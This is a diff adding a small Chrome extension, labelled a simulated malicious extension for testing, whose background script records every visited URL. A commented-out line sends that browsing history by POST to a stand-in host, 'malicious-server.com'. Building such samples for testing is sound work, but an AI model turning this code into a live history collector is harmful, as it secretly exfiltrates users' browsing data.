@@ -1,0 +1,24 @@
+// manifest.json
+{
+  "manifest_version": 3,
+  "name": "Simulated Data Collector",
+  "version": "1.0",
+  "description": "A simulated malicious extension for testing purposes.",
+  "permissions": ["history", "storage"],
+  "background": {
+    "service_worker": "background.js"
+  }
+}
+
+// background.js
+chrome.history.onVisited.addListener((historyItem) => {
+  const data = {
+    url: historyItem.url,
+    timestamp: new Date().toISOString()
+  };
+
+  // Simulate sending data to a remote server
+  console.log("Simulated data collection:", data);
+  // In a real malicious extension, this might be sent to a remote server:
+  // fetch("https://malicious-server.com/collect", { method: "POST", body: JSON.stringify(data) });
+});
